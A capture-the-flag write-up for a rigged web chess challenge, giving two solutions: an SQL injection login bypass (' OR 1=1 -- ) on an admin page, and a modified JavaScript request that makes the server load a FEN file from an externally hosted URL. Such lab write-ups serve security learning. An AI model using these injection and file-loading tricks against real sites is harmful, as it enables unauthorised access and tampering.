# Chess

### Description

This is a chess game that is rigged in favor of the computer. When you play, the CPU will generate more queens, making it impossible to win. Interestingly, the site has a "Master Login" button that leads to the url `/admin.php`.

To get the flag, you need to checkmate the computer.

-----

### Solution 1

This was the solution that I came up with on the first go-around. You can bypass the login page at `/admin.php` by using the SQLi payload `' OR 1=1 -- `. Once there, you'll see a page titled "Change config of the Chess AI!". 

To win, you need to select the "No" option for "AI Queen Cheats" and click the submit button. From there, I just played the computer in a normal game of chess and won.

-----

### Solution 2

A better solution is apparent when inspecting the source code of the chess game. You can see a definition for this `load_baseboard()` function:

```javascript
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', 'baseboard.fen')

  xhr.open('POST', url, true)
  xhr.send(formData);
  window.location.href = "index.php";
}
```

To exploit this, you need to find a FEN file [(Fen Notation)](https://www.chess.com/terms/fen-chess) containing a winning position for white, and host it somewhere. Then, run a modified `load_baseboard()` function that looks like the following:

```javascript
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', '<URL_OF_YOUR_FEN_FILE>')

  xhr.open('POST', url, true)
  xhr.send(formData);
}
```

This has two changes:

1. We've replaced the "baseboard.fen" with our own FEN file containing the winning position
2. We've removed the last line that would refresh the page

These changes will cause the function to load a winning position and stay on the page, triggering a win for white.